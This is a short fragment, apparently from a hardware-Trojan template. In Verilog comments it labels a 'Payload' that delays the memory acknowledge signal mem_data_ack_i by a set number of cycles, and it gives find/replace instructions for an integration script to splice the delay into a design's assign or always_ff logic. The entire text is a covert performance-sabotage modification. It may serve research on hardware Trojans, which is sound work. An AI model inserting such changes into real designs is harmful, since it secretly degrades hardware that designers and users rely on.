 ...
 * Payload: Delay mem_data_ack_i by N cycles
 * 
...
// ============================================================
// Performance Degradation: Delay mem_data_ack_i by DELAY_CYCLES
//
// Integration Script Must Modify:
//
// IF mem_data_ack_i is a ready/valid signal:
//   Find: assign mem_data_ack_i = ready_condition;
//   Replace: assign mem_data_ack_i = (delay_counter == 0) ? ready_condition : 1'b0;
//
// IF mem_data_ack_i is in always_ff:
//   Find: mem_data_ack_i <= ready_value;
//   Replace: mem_data_ack_i <= (delay_counter == 0) ? ready_value : 1'b0;